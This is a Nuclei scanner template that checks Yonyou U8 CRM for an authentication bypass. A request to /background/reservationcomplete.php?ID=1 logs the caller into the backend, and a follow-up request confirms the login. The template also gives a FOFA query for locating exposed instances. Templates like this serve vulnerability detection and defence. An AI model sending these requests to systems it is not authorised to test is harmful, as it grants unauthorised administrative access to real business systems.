id: yonyou-u8-crm-reservationcomplete-unauth
info:
  name: 用友 U8 CRM reservationcomplete.php - unauth
  author: leadlife
  severity: high
  description: 用友CRM系统存在逻辑漏洞直接登录后台
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BCRM%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0.md
  metadata:
    verified: true
    fofa-query: app="用友U8CRM"
  tags: yonyou,u8crm,unauth,oa

http:
  - raw:
      - |
        GET /background/reservationcomplete.php?ID=1 HTTP/1.1
        Host: {{Hostname}}
      
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2,'您好！帐套')"
        condition: and

# 检测没有问题，访问时，尽量测试 2 次